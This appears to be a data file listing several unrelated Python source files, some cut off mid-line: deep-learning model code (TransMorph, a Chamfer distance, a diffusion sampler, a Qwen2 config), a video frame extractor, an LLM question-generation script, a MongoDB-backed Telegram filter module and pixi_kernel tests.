    "'''\r\nTransMorph model\r\n\r\nSwin-Transformer code retrieved from:\r\nhttps://github.com/SwinTransformer/Swin-Transformer-Semantic-Segmentation\r\n\r\nOriginal paper:\r\nLiu, Z., Lin, Y., Cao, Y., Hu, H., Wei, Y., Zhang, Z., ... & Guo, B. (2021).\r\nSwin transformer: Hierarchical vision transformer using shifted windows.\r\narXiv preprint arXiv:2103.14030.\r\n\r\nModified and tested by:\r\nJunyu Chen\r\njchen245@jhmi.edu\r\nJohns Hopkins University\r\n'''\r\n\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.utils.checkpoint as checkpoint\r\nfrom timm.models.layers import DropPath, trunc_normal_, to_3tuple\r\nfrom torch.distributions.normal import Normal\r\nimport torch.nn.functional as nnf\r\nimport numpy as np\r\nimport configs_TransMorph as configs\r\nfrom networks import Unet, ConvBlock\r\nimport pdb\r\nimport sys\r\nsys.path.append(r\"/media/ziyang/14TBWD/VMambaMorph/MambaMorph/mambamorph/torch\")\r\nimport layers\r\nfrom mamba import MambaLayer\r\ntry:\r\n    from mamba import *\r\nexcept ModuleNotFoundError:\r\n    pass\r\n\r\n\r\nclass Mlp(nn.Module):\r\n    def __init__(self, in_features, hidden_features=None, out_features=None, act_layer=nn.GELU, drop=0.):\r\n        super().__init__()\r\n        out_features = out_features or in_features\r\n        hidden_features = hidden_features or in_features\r\n        self.fc1 = nn.Linear(in_features, hidden_features)\r\n        self.act = act_layer()\r\n        self.fc2 = nn.Linear(hidden_features, out_features)\r\n        self.drop = nn.Dropout(drop)\r\n\r\n    def forward(self, x):\r\n        x = self.fc1(x)\r\n        x = self.act(x)\r\n        x = self.drop(x)\r\n        x = self.fc2(x)\r\n        x = self.drop(x)\r\n        return x\r\n\r\n\r\ndef window_partition(x, window_size):\r\n    \"\"\"\r\n    Args:\r\n        x: (B, H, W, L, C)\r\n        window_size (int): window size\r\n    Returns:\r\n        windows: (num_windows*B, window_size, window_size, window_size, C)\r\n    \"\"\"\r\n    B, H, W, L, C = x.shape\r\n    x = x.view(B, H // window_size[0], window_size[0], W // window_size[1], window_size[1], L // window_size[2],\r\n               window_size[2], C)\r\n\r\n    windows = x.permute(0, 1, 3, 5, 2, 4, 6, 7).contiguous().view(-1, window_size[0], window_size[1], window_size[2], C)\r\n    return windows\r\n\r\n\r\ndef window_reverse(windows, window_size, H, W, L):\r\n    \"\"\"\r\n    Args:\r\n        windows: (num_windows*B, window_size, window_size, window_size, C)\r\n        window_size (int): Window size\r\n        H (int): Height of image\r\n        W (int): Width of image\r\n        L (int): Length of image\r\n    Returns:\r\n        x: (B, H, W, L, C)\r\n    \"\"\"\r\n    B = int(windows.shape[0] / (H * W * L / window_size[0] / window_size[1] / window_size[2]))\r\n    x = windows.view(B, H // window_size[0], W // window_size[1], L // window_size[2], window_size[0], window_size[1],\r\n                     window_size[2], -1)\r\n    x = x.permute(0, 1, 4, 2, 5, 3, 6, 7).contiguous().view(B, H, W, L, -1)\r\n    return x\r\n\r\n\r\nclass WindowAttention(nn.Module):\r\n    \"\"\" Window based multi-head self attention (W-MSA) module with relative position bias.\r\n    It supports both of shifted and non-shifted window.\r\n    Args:\r\n        dim (int): Number of input channels.\r\n        window_size (tuple[int]): The height and width of the window.\r\n        num_heads (int): Number of attention heads.\r\n        qkv_bias (bool, optional):  If True, add a learnable bias to query, key, value. Default: True\r\n        qk_scale (float | None, optional): Override default qk scale of head_dim ** -0.5 if set\r\n        attn_drop (float, optional): Dropout ratio of attention weight. Default: 0.0\r\n        proj_drop (float, optional): Dropout ratio of output. Default: 0.0\r\n    \"\"\"\r\n\r\n    def __init__(self, dim, window_size, num_heads, qkv_bias=True, qk_scale=None, rpe=True, attn_drop=0., proj_drop=0.):\r\n\r\n        super().__init__()\r\n        self.dim = dim\r\n        self.window_size = window_size  # Wh, Ww\r\n        self.num_heads = num_heads\r\n        head_dim = dim // num_heads\r\n        self.scale = qk_scale or head_dim ** -0.5\r\n\r\n        # define a parameter table of relative position bias\r\n        self.relative_position_bias_table = nn.Parameter(\r\n            torch.zeros((2 * window_size[0] - 1) * (2 * window_size[1] - 1) * (2 * window_size[2] - 1),\r\n                        num_heads))  # 2*Wh-1 * 2*Ww-1 * 2*Wt-1, nH\r\n\r\n        # get pair-wise relative position index for each token inside the window\r\n        coords_h = torch.arange(self.window_size[0])\r\n        coords_w = torch.arange(self.window_size[1])\r\n        coords_t = torch.arange(self.window_size[2])\r\n        coords = torch.stack(torch.meshgrid([coords_h, coords_w, coords_t]))  # 3, Wh, Ww, Wt\r\n        coords_flatten = torch.flatten(coords, 1)  # 3, Wh*Ww*Wt\r\n        self.rpe = rpe\r\n        if self.rpe:\r\n            relative_coords = coords_flatten[:, :, None] - coords_flatten[:, None, :]  # 3, Wh*Ww*Wt, Wh*Ww*Wt\r\n            relative_coords = relative_coords.permute(1, 2, 0).contiguous()  # Wh*Ww*Wt, Wh*Ww*Wt, 3\r\n            relative_coords[:, :, 0] += self.window_size[0] - 1  # shift to sta",
    "'''\r\n\u8bfb\u53d6pkl\u83b7\u5f97\u6bcf\u4e00\u4e2a\u89c6\u9891\u7684\u5e27\u7684\u6570\u91cf\uff0c\u7136\u540e\u5c06video\u89c6\u9891\u8f6c\u6362\u4e3a\u4e00\u5f20\u5f20\u56fe\u7247\u3002\r\n\r\nTODO\uff1a\u662f\u5426\u8981\u5c06\u56fe\u7247\u538b\u6210\u4e00\u4e2anpy\u6587\u4ef6\uff1f\u4e5f\u8bb8\u53ef\u4ee5\u51cf\u5c11IO\u3002re:\u5343\u4e07\u522b\uff0c\u592a\u5403\u5185\u5b58\r\n\r\nexample:\r\npython utils/video2img.py --root_dir /share/datasets/HOI-mocap/20230904 --video_id 20230904_01\r\n'''\r\n\r\nimport os\r\nimport sys\r\nsys.path.append('.')\r\nimport cv2\r\nfrom tqdm import tqdm\r\nimport argparse\r\nimport pickle\r\nimport multiprocessing as mlp\r\nfrom utils.hoi_io import get_valid_video_list\r\n\r\ndef mp42img(video_path, img_dir, num_frame, original_num_frame, cnt2frame_id_dict, res_prefix='', res_suffix=''):\r\n    os.makedirs(img_dir, exist_ok=True)\r\n    assert os.path.exists(video_path)\r\n\r\n    cap = cv2.VideoCapture(video_path)\r\n    fourcc = cv2.VideoWriter_fourcc(*\"mp4v\")\r\n    cap.set(cv2.CAP_PROP_FOURCC, fourcc)\r\n    fps = cap.get(cv2.CAP_PROP_FPS)\r\n    W = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))\r\n    H = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))\r\n\r\n    # print(fps, W, H)\r\n\r\n    suc = cap.isOpened()\r\n\r\n    # for frame_cnt in tqdm(range(1, num_frame + 1)):\r\n    #     suc, img = cap.read()\r\n    #     assert suc\r\n    #     cv2.imwrite(os.path.join(img_dir, res_prefix + str(frame_cnt).zfill(5) + res_suffix + \".png\"), img)\r\n    cnt = 0\r\n    while True:\r\n        suc, img = cap.read()\r\n        if not suc:\r\n            break\r\n        cnt += 1\r\n        frame_id = cnt2frame_id_dict.get(cnt, None)\r\n        if frame_id is not None:\r\n            cv2.imwrite(os.path.join(img_dir, res_prefix + frame_id + res_suffix + \".png\"), img)\r\n    assert cnt == original_num_frame, f'cnt: {cnt}, original_num_frame: {original_num_frame}'\r\n\r\n    cap.release()\r\n\r\nif __name__ == \"__main__\":\r\n    # camera_list = ['22070938', '22139905', '22139909', '22139910', '22139911', '22139913', '22139916', '22139946']\r\n    camera_list = ['21218078', '22070938', '22139905', '22139906', '22139908', '22139909', '22139910', '22139911', '22139913', '22139914', '22139916', '22139946']\r\n\r\n    parser = argparse.ArgumentParser()\r\n    # parser.add_argument('--root_dir', required=True, type=str)\r\n    # parser.add_argument('--video_id', required=True, type=str)\r\n    args = parser.parse_args()\r\n\r\n    # root_dir = args.root_dir\r\n    # video_id = args.video_id\r\n    date = '20231005'\r\n    root_dir = f'/share/datasets/HOI-mocap/{date}'\r\n\r\n    # video_list = [f'{date}_{str(i).zfill(3)}' for i in range(1, 54)]\r\n\r\n    # dir_list = os.listdir(root_dir)\r\n    # video_list = [dir for dir in dir_list if dir != 'camera_params' and 'cali' not in dir and not dir.endswith('txt')]\r\n    # video_list.sort()\r\n\r\n    video_list = get_valid_video_list(date)\r\n\r\n    print(video_list)\r\n\r\n    for video_id in tqdm(video_list):\r\n        assert os.path.exists(root_dir)\r\n        video_dir = os.path.join(root_dir, video_id)\r\n        assert os.path.exists(video_dir)\r\n\r\n        # metadata_dir = os.path.join('/share/hlyang/results', video_id, 'metadata')\r\n        metadata_dir = os.path.join('/share/hlyang/results', date, video_id, 'metadata')\r\n\r\n        # \u90e8\u5206\u6570\u636e\u51fa\u9519\uff0c\u6ca1\u6709metadata\uff0c\u76f4\u63a5\u8df3\u8fc7\r\n        if not os.path.exists(metadata_dir) or len(os.listdir(metadata_dir)) == 0:\r\n            print(f'{video_id}\u90e8\u5206\u6570\u636e\u51fa\u9519\uff0c\u6ca1\u6709metadata')\r\n            continue\r\n\r\n        # img_root = os.path.join('/share/hlyang/results', video_id, 'imgs')\r\n        img_root = os.path.join('/share/hlyang/results', date, video_id, 'imgs')\r\n\r\n\r\n        # \u8df3\u8fc7\u5df2\u7ecf\u5904\u7406\u8fc7\u7684\r\n        # if os.path.exists(img_root):\r\n        #     continue\r\n\r\n        os.makedirs(img_root, exist_ok=True)\r\n\r\n        procs = []\r\n\r\n        for camera_id in camera_list:\r\n            metadata_path = os.path.join(metadata_dir, camera_id + '.pkl')\r\n            with open(metadata_path, 'rb') as f:\r\n                metadata = pickle.load(f)\r\n            num_frame = metadata['num_frame']\r\n            original_num_frame = metadata['original_num_frame']\r\n            cnt2frame_id_dict = metadata['cnt2frame_id_dict']\r\n\r\n            video_path = os.path.join(video_dir, 'rgb', camera_id + '.mp4')\r\n            img_dir = os.path.join(img_root, camera_id)\r\n            os.makedirs(img_dir, exist_ok=True)\r\n\r\n            # mp42img(video_path, img_dir, num_frame, res_prefix = camera_id + '_')\r\n            args = (video_path, img_dir, num_frame, original_num_frame, cnt2frame_id_dict, camera_id + '_')\r\n            proc = mlp.Process(target=mp42img, args=args)\r\n            proc.start()\r\n            procs.append(proc)\r\n\r\n        for i in range(len(procs)):\r\n            procs[i].join()",
    "import json\nimport os\nfrom tqdm import tqdm\nfrom concurrent.futures import ThreadPoolExecutor\nimport argparse\nfrom utils import get_prompt\nfrom openai import OpenAI\n\nMAX_API_RETRY = 5\nAPI_KEY = os.environ[\"OPENAI_API_KEY\"]\n\n\ndef get_response(query, transformed_constraint_list, prompt):\n    tmp_save = {}\n    for _ in range(MAX_API_RETRY):\n        try:\n            client = OpenAI(api_key=API_KEY)\n            response = client.chat.completions.create(\n                model='gpt-4-turbo-preview',\n                max_tokens=1024,\n                top_p=0.3,\n                temperature=0.4,\n                messages=[{\n                    'role': 'user',\n                    'content': prompt,\n                }],\n            )\n            content = response.choices[0].message.content\n        except Exception as e:\n            print(f\"failed...{e}\")\n            continue\n        try:\n            if content.startswith(\"```json\"): # remove markdown, used for gpt-4 turbo\n                content = content[7:-3]\n            answer = json.loads(content)\n        except Exception as e:\n            print(f\"json failed to parse: {e}\")\n            print(f\"content: {content}\")\n            return None\n        tmp_save = {\n            'constraints': transformed_constraint_list,\n            'constrainted_questions': answer\n        }\n        return query, tmp_save\n\ndef transform_constraints(constraints):\n    constraints_str = \"\"\n    for k, v in constraints.items():\n        if type(v) is str:\n            v = v.split('\uff0c')\n            if len(v) == 1:\n                v = v[0].split('\u3001')\n            v = str(v)\n        elif type(v) is dict:\n            tmp_str = \"\"\n            for k_, v_ in v.items():\n                if type(v_) is str:\n                    v_ = str(v_.split('\u3001'))\n                else:\n                    v_ = str(v_)\n                tmp_str += f\"{k_}\uff1a{v_}\\n\"\n            v = tmp_str\n        elif type(v) is list:\n            v = str(v)\n        if type(v) is not str:\n            return {}\n        constraints_str += f\"{k}: {v}\\n\"\n    return constraints_str\n\ndef main(args):\n    # load input queries\n    input_file = os.path.join(args.dir, \"03_constraint_list.json\")\n    output_file = os.path.join(args.dir, \"04_constrainted_question.json\")\n\n    constraints = json.load(open(input_file, \"r\"))\n    constrainted_question = {}\n\n    # load prompt\n    prompt = get_prompt(\"general recombination\")\n\n    # load saved samples\n    dedup_set = set()\n    try:\n        with open(output_file, \"r\") as f:\n            constrainted_question = json.load(f)\n            dedup_set = set(constrainted_question.keys())\n    except:\n        pass\n\n    passed_args = []\n    for query, constraint_list in constraints.items():\n        if query in dedup_set:\n            continue\n        transformed_constraint_list = transform_constraints(constraint_list)\n        passed_args.append((query, transformed_constraint_list, prompt % (transformed_constraint_list, query)))\n\n    with ThreadPoolExecutor(max_workers=args.worker) as executor:\n        for save_count, future in enumerate(tqdm(executor.map(get_response, *zip(*passed_args)), total=len(passed_args))):\n            if future is not None:\n                query, tmp_save = future\n                constrainted_question[query] = tmp_save\n                if save_count % args.save_iterval == 0:\n                    with open(output_file, \"w\") as f:\n                        json.dump(constrainted_question, f, ensure_ascii=False, indent=4)\n                    print(f\"File Saved\")\n\n    # save\n    with open(output_file, \"w\") as f:\n        json.dump(constrainted_question, f, indent=4)\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--dir\", type=str, help=\"input file path for sentences\", default=\"conifer_data\")\n    parser.add_argument(\"--save-iterval\", type=int, help=\"save to file after generating K samples\", default=2)\n    parser.add_argument(\"--worker\", type=int, help=\"number of concurrent workers\", default=4)\n    args = parser.parse_args()\n    main(args)",
    "import pymongo\nfrom info import DATABASE_URI, DATABASE_NAME\nfrom pyrogram import enums\nimport logging\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.ERROR)\n\nmyclient = pymongo.MongoClient(DATABASE_URI)\nmydb = myclient[DATABASE_NAME]\n\n\n\nasync def add_filter(grp_id, text, reply_text, btn, file, alert):\n    mycol = mydb[str(grp_id)]\n    # mycol.create_index([('text', 'text')])\n\n    data = {\n        'text':str(text),\n        'reply':str(reply_text),\n        'btn':str(btn),\n        'file':str(file),\n        'alert':str(alert)\n    }\n\n    try:\n        mycol.update_one({'text': str(text)},  {\"$set\": data}, upsert=True)\n    except:\n        logger.exception('Some error occured!', exc_info=True)\n             \n     \nasync def find_filter(group_id, name):\n    mycol = mydb[str(group_id)]\n    \n    query = mycol.find( {\"text\":name})\n    # query = mycol.find( { \"$text\": {\"$search\": name}})\n    try:\n        for file in query:\n            reply_text = file['reply']\n            btn = file['btn']\n            fileid = file['file']\n            try:\n                alert = file['alert']\n            except:\n                alert = None\n        return reply_text, btn, alert, fileid\n    except:\n        return None, None, None, None\n\n\nasync def get_filters(group_id):\n    mycol = mydb[str(group_id)]\n\n    texts = []\n    query = mycol.find()\n    try:\n        for file in query:\n            text = file['text']\n            texts.append(text)\n    except:\n        pass\n    return texts\n\n\nasync def delete_filter(message, text, group_id):\n    mycol = mydb[str(group_id)]\n    \n    myquery = {'text':text }\n    query = mycol.count_documents(myquery)\n    if query == 1:\n        mycol.delete_one(myquery)\n        await message.reply_text(\n            f\"'`{text}`'  deleted. I'll not respond to that filter anymore.\",\n            quote=True,\n            parse_mode=enums.ParseMode.MARKDOWN\n        )\n    else:\n        await message.reply_text(\"Couldn't find that filter!\", quote=True)\n\n\nasync def del_all(message, group_id, title):\n    if str(group_id) not in mydb.list_collection_names():\n        await message.edit_text(f\"Nothing to remove in {title}!\")\n        return\n\n    mycol = mydb[str(group_id)]\n    try:\n        mycol.drop()\n        await message.edit_text(f\"All filters from {title} has been removed\")\n    except:\n        await message.edit_text(\"Couldn't remove all filters from group!\")\n        return\n\n\nasync def count_filters(group_id):\n    mycol = mydb[str(group_id)]\n\n    count = mycol.count()\n    return False if count == 0 else count\n\n\nasync def filter_stats():\n    collections = mydb.list_collection_names()\n\n    if \"CONNECTION\" in collections:\n        collections.remove(\"CONNECTION\")\n\n    totalcount = 0\n    for collection in collections:\n        mycol = mydb[collection]\n        count = mycol.count()\n        totalcount += count\n\n    totalcollections = len(collections)\n\n    return totalcollections, totalcount\n",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\n\"\"\" Chamfer distance in Pytorch.\nAuthor: Charles R. Qi\n\"\"\"\n\nimport torch\nimport torch.nn as nn\nimport numpy as np\n\n\ndef huber_loss(error, delta=1.0):\n    \"\"\"\n    Args:\n        error: Torch tensor (d1,d2,...,dk)\n    Returns:\n        loss: Torch tensor (d1,d2,...,dk)\n\n    x = error = pred - gt or dist(pred,gt)\n    0.5 * |x|^2                 if |x|<=d\n    0.5 * d^2 + d * (|x|-d)     if |x|>d\n    Ref: https://github.com/charlesq34/frustum-pointnets/blob/master/models/model_util.py\n    \"\"\"\n    abs_error = torch.abs(error)\n    # quadratic = torch.min(abs_error, torch.FloatTensor([delta]))\n    quadratic = torch.clamp(abs_error, max=delta)\n    linear = abs_error - quadratic\n    loss = 0.5 * quadratic**2 + delta * linear\n    return loss\n\n\ndef nn_distance(pc1, pc2, l1smooth=False, delta=1.0, l1=False):\n    \"\"\"\n    Input:\n        pc1: (B,N,C) torch tensor\n        pc2: (B,M,C) torch tensor\n        l1smooth: bool, whether to use l1smooth loss\n        delta: scalar, the delta used in l1smooth loss\n    Output:\n        dist1: (B,N) torch float32 tensor\n        idx1: (B,N) torch int64 tensor\n        dist2: (B,M) torch float32 tensor\n        idx2: (B,M) torch int64 tensor\n    \"\"\"\n    N = pc1.shape[1]\n    M = pc2.shape[1]\n    pc1_expand_tile = pc1.unsqueeze(2).repeat(1, 1, M, 1)\n    pc2_expand_tile = pc2.unsqueeze(1).repeat(1, N, 1, 1)\n    pc_diff = pc1_expand_tile - pc2_expand_tile\n\n    if l1smooth:\n        pc_dist = torch.sum(huber_loss(pc_diff, delta), dim=-1)  # (B,N,M)\n    elif l1:\n        pc_dist = torch.sum(torch.abs(pc_diff), dim=-1)  # (B,N,M)\n    else:\n        pc_dist = torch.sum(pc_diff**2, dim=-1)  # (B,N,M)\n    dist1, idx1 = torch.min(pc_dist, dim=2)  # (B,N)\n    dist2, idx2 = torch.min(pc_dist, dim=1)  # (B,M)\n    return dist1, idx1, dist2, idx2\n\n\ndef demo_nn_distance():\n    np.random.seed(0)\n    pc1arr = np.random.random((1, 5, 3))\n    pc2arr = np.random.random((1, 6, 3))\n    pc1 = torch.from_numpy(pc1arr.astype(np.float32))\n    pc2 = torch.from_numpy(pc2arr.astype(np.float32))\n    dist1, idx1, dist2, idx2 = nn_distance(pc1, pc2)\n    print(dist1)\n    print(idx1)\n    dist = np.zeros((5, 6))\n    for i in range(5):\n        for j in range(6):\n            dist[i, j] = np.sum((pc1arr[0, i, :] - pc2arr[0, j, :]) ** 2)\n    print(dist)\n    print(\"-\" * 30)\n    print(\"L1smooth dists:\")\n    dist1, idx1, dist2, idx2 = nn_distance(pc1, pc2, True)\n    print(dist1)\n    print(idx1)\n    dist = np.zeros((5, 6))\n    for i in range(5):\n        for j in range(6):\n            error = np.abs(pc1arr[0, i, :] - pc2arr[0, j, :])\n            quad = np.minimum(error, 1.0)\n            linear = error - quad\n            loss = 0.5 * quad**2 + 1.0 * linear\n            dist[i, j] = np.sum(loss)\n    print(dist)\n\n\nif __name__ == \"__main__\":\n    demo_nn_distance()\n",
    "import logging\nimport re\nfrom pathlib import Path\n\nimport pytest\n\nfrom pixi_kernel.errors import (\n    PIXI_KERNEL_NOT_FOUND,\n    PIXI_MANIFEST_NOT_FOUND,\n    PIXI_NOT_FOUND,\n    PIXI_VERSION_ERROR,\n    PIXI_VERSION_NOT_SUPPORTED,\n)\nfrom pixi_kernel.pixi import MINIMUM_PIXI_VERSION, PixiDiscoveryError, find_project_manifest\n\ndata_dir = Path(__file__).parent / \"data\"\nlogger = logging.getLogger(__name__)\n\n\n@pytest.mark.usefixtures(\"_patch_path\")\ndef test_pixi_not_installed():\n    expected_error_message = re.escape(PIXI_NOT_FOUND.format(kernel_display_name=\"Pixi\"))\n\n    with pytest.raises(PixiDiscoveryError, match=expected_error_message):\n        find_project_manifest(cwd=Path(\"/\"), package_name=\"pixi\", kernel_display_name=\"Pixi\")\n\n\n@pytest.mark.usefixtures(\"_patch_pixi_version_exit_code\")\ndef test_pixi_version_bad_exit_code():\n    expected_error_message = re.escape(PIXI_VERSION_ERROR.format(kernel_display_name=\"Pixi\"))\n\n    with pytest.raises(PixiDiscoveryError, match=expected_error_message):\n        find_project_manifest(cwd=Path(\"/\"), package_name=\"pixi\", kernel_display_name=\"Pixi\")\n\n\n@pytest.mark.usefixtures(\"_patch_pixi_version_bad_stdout\")\ndef test_pixi_version_bad_stdout():\n    expected_error_message = re.escape(PIXI_VERSION_ERROR.format(kernel_display_name=\"Pixi\"))\n\n    with pytest.raises(PixiDiscoveryError, match=expected_error_message):\n        find_project_manifest(cwd=Path(\"/\"), package_name=\"pixi\", kernel_display_name=\"Pixi\")\n\n\n@pytest.mark.usefixtures(\"_patch_pixi_version_value\")\ndef test_outdated_pixi():\n    expected_error_message = re.escape(\n        PIXI_VERSION_NOT_SUPPORTED.format(\n            kernel_display_name=\"Pixi\",\n            minimum_version=MINIMUM_PIXI_VERSION,\n        )\n    )\n\n    with pytest.raises(PixiDiscoveryError, match=expected_error_message):\n        find_project_manifest(cwd=Path(\"/\"), package_name=\"pixi\", kernel_display_name=\"Pixi\")\n\n\ndef test_empty_project():\n    cwd = Path(\"/\")\n    expected_error_message = re.escape(PIXI_MANIFEST_NOT_FOUND.format(cwd=cwd))\n\n    with pytest.raises(PixiDiscoveryError, match=expected_error_message):\n        find_project_manifest(cwd=cwd, package_name=\"pixi\", kernel_display_name=\"Pixi\")\n\n\ndef test_missing_ipykernel():\n    cwd = data_dir / \"missing_ipykernel\"\n    package_name = \"ipykernel\"\n    kernel_display_name = \"Pixi - Python 3 (ipykernel)\"\n\n    expected_error_message = re.escape(\n        PIXI_KERNEL_NOT_FOUND.format(\n            package_name=package_name,\n            kernel_display_name=kernel_display_name,\n        )\n    )\n\n    with pytest.raises(PixiDiscoveryError, match=expected_error_message):\n        find_project_manifest(\n            cwd=cwd,\n            package_name=package_name,\n            kernel_display_name=kernel_display_name,\n        )\n\n\ndef test_pixi_project():\n    cwd = data_dir / \"pixi_project\"\n    package_name = \"ipykernel\"\n    kernel_display_name = \"Pixi - Python 3 (ipykernel)\"\n\n    result = find_project_manifest(\n        cwd=cwd,\n        package_name=package_name,\n        kernel_display_name=kernel_display_name,\n    )\n    assert result == (cwd / \"pixi.toml\").resolve()\n\n\ndef test_pyproject_project():\n    cwd = data_dir / \"pyproject_project\"\n    package_name = \"ipykernel\"\n    kernel_display_name = \"Pixi - Python 3 (ipykernel)\"\n\n    result = find_project_manifest(\n        cwd=cwd,\n        package_name=package_name,\n        kernel_display_name=kernel_display_name,\n    )\n    assert result == (cwd / \"pyproject.toml\").resolve()\n",
    "from importlib import import_module\r\nfrom tqdm.auto import trange\r\nimport torch\r\n\r\nsampling = None\r\nBACKEND = None\r\nINITIALIZED = False\r\n\r\nif not BACKEND:\r\n    try:\r\n        _ = import_module(\"modules.sd_samplers_kdiffusion\")\r\n        sampling = import_module(\"k_diffusion.sampling\")\r\n        BACKEND = \"WebUI\"\r\n    except ImportError as _:\r\n        pass\r\n\r\nif not BACKEND:\r\n    try:\r\n        sampling = import_module(\"comfy.k_diffusion.sampling\")\r\n        BACKEND = \"ComfyUI\"\r\n    except ImportError as _:\r\n        pass\r\n\r\n\r\nclass _Rescaler:\r\n    def __init__(self, model, x, mode, **extra_args):\r\n        self.model = model\r\n        self.x = x\r\n        self.mode = mode\r\n        self.extra_args = extra_args\r\n        if BACKEND == \"WebUI\":\r\n            self.init_latent, self.mask, self.nmask = model.init_latent, model.mask, model.nmask\r\n        if BACKEND == \"ComfyUI\":\r\n            self.latent_image, self.noise = model.latent_image, model.noise\r\n            self.denoise_mask = self.extra_args.get(\"denoise_mask\", None)\r\n\r\n    def __enter__(self):\r\n        if BACKEND == \"WebUI\":\r\n            if self.init_latent is not None:\r\n                self.model.init_latent = torch.nn.functional.interpolate(input=self.init_latent, size=self.x.shape[2:4], mode=self.mode)\r\n            if self.mask is not None:\r\n                self.model.mask = torch.nn.functional.interpolate(input=self.mask.unsqueeze(0), size=self.x.shape[2:4], mode=self.mode).squeeze(0)\r\n            if self.nmask is not None:\r\n                self.model.nmask = torch.nn.functional.interpolate(input=self.nmask.unsqueeze(0), size=self.x.shape[2:4], mode=self.mode).squeeze(0)\r\n        if BACKEND == \"ComfyUI\":\r\n            if self.latent_image is not None:\r\n                self.model.latent_image = torch.nn.functional.interpolate(input=self.latent_image, size=self.x.shape[2:4], mode=self.mode)\r\n            if self.noise is not None:\r\n                self.model.noise = torch.nn.functional.interpolate(input=self.latent_image, size=self.x.shape[2:4], mode=self.mode)\r\n            if self.denoise_mask is not None:\r\n                self.extra_args[\"denoise_mask\"] = torch.nn.functional.interpolate(input=self.denoise_mask, size=self.x.shape[2:4], mode=self.mode)\r\n\r\n        return self\r\n\r\n    def __exit__(self, type, value, traceback):\r\n        if BACKEND == \"WebUI\":\r\n            del self.model.init_latent, self.model.mask, self.model.nmask\r\n            self.model.init_latent, self.model.mask, self.model.nmask = self.init_latent, self.mask, self.nmask\r\n        if BACKEND == \"ComfyUI\":\r\n            del self.model.latent_image, self.model.noise\r\n            self.model.latent_image, self.model.noise = self.latent_image, self.noise\r\n\r\n\r\n@torch.no_grad()\r\ndef dy_sampling_step(x, model, dt, sigma_hat, **extra_args):\r\n    original_shape = x.shape\r\n    batch_size, channels, m, n = original_shape[0], original_shape[1], original_shape[2] // 2, original_shape[3] // 2\r\n    extra_row = x.shape[2] % 2 == 1\r\n    extra_col = x.shape[3] % 2 == 1\r\n\r\n    if extra_row:\r\n        extra_row_content = x[:, :, -1:, :]\r\n        x = x[:, :, :-1, :]\r\n    if extra_col:\r\n        extra_col_content = x[:, :, :, -1:]\r\n        x = x[:, :, :, :-1]\r\n\r\n    a_list = x.unfold(2, 2, 2).unfold(3, 2, 2).contiguous().view(batch_size, channels, m * n, 2, 2)\r\n    c = a_list[:, :, :, 1, 1].view(batch_size, channels, m, n)\r\n\r\n    with _Rescaler(model, c, 'nearest-exact', **extra_args) as rescaler:\r\n        denoised = model(c, sigma_hat * c.new_ones([c.shape[0]]), **rescaler.extra_args)\r\n    d = sampling.to_d(c, sigma_hat, denoised)\r\n    c = c + d * dt\r\n\r\n    d_list = c.view(batch_size, channels, m * n, 1, 1)\r\n    a_list[:, :, :, 1, 1] = d_list[:, :, :, 0, 0]\r\n    x = a_list.view(batch_size, channels, m, n, 2, 2).permute(0, 1, 2, 4, 3, 5).reshape(batch_size, channels, 2 * m, 2 * n)\r\n\r\n    if extra_row or extra_col:\r\n        x_expanded = torch.zeros(original_shape, dtype=x.dtype, device=x.device)\r\n        x_expanded[:, :, :2 * m, :2 * n] = x\r\n        if extra_row:\r\n            x_expanded[:, :, -1:, :2 * n + 1] = extra_row_content\r\n        if extra_col:\r\n            x_expanded[:, :, :2 * m, -1:] = extra_col_content\r\n        if extra_row and extra_col:\r\n            x_expanded[:, :, -1:, -1:] = extra_col_content[:, :, -1:, :]\r\n        x = x_expanded\r\n\r\n    return x\r\n\r\n\r\n@torch.no_grad()\r\ndef sample_euler_dy(model, x, sigmas, extra_args=None, callback=None, disable=None, s_churn=0., s_tmin=0.,\r\n                               s_tmax=float('inf'), s_noise=1.):\r\n    extra_args = {} if extra_args is None else extra_args\r\n    s_in = x.new_ones([x.shape[0]])\r\n    for i in trange(len(sigmas) - 1, disable=disable):\r\n        # print(i)\r\n        # i\u7b2c\u4e00\u6b65\u4e3a0\r\n        gamma = max(s_churn / (len(sigmas) - 1), 2 ** 0.5 - 1) if s_tmin <= sigmas[i] <= s_tmax else 0.\r\n        eps = torch.randn_like(x) * s_noise\r\n        sigma_hat = sigmas[i] * (gamma + 1)\r\n        # print(sigma_hat)\r\n        dt = sigmas[i + 1] - sigma_hat\r\n        if gamma > 0:\r",
    "# coding=utf-8\n# Copyright 2024 The Qwen team, Alibaba Group and the HuggingFace Inc. team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\" Qwen2 model configuration\"\"\"\n\nfrom transformers.configuration_utils import PretrainedConfig\nfrom transformers.utils import logging\n\n\nlogger = logging.get_logger(__name__)\n\nQWEN2_PRETRAINED_CONFIG_ARCHIVE_MAP = {\n    \"Qwen/Qwen2-7B-beta\": \"https://huggingface.co/Qwen/Qwen2-7B-beta/resolve/main/config.json\",\n}\n\n\nclass Qwen2Config(PretrainedConfig):\n    r\"\"\"\n    This is the configuration class to store the configuration of a [`Qwen2Model`]. It is used to instantiate a\n    Qwen2 model according to the specified arguments, defining the model architecture. Instantiating a configuration\n    with the defaults will yield a similar configuration to that of\n    Qwen2-7B-beta [Qwen/Qwen2-7B-beta](https://huggingface.co/Qwen/Qwen2-7B-beta).\n\n    Configuration objects inherit from [`PretrainedConfig`] and can be used to control the model outputs. Read the\n    documentation from [`PretrainedConfig`] for more information.\n\n\n    Args:\n        vocab_size (`int`, *optional*, defaults to 151936):\n            Vocabulary size of the Qwen2 model. Defines the number of different tokens that can be represented by the\n            `inputs_ids` passed when calling [`Qwen2Model`]\n        hidden_size (`int`, *optional*, defaults to 4096):\n            Dimension of the hidden representations.\n        intermediate_size 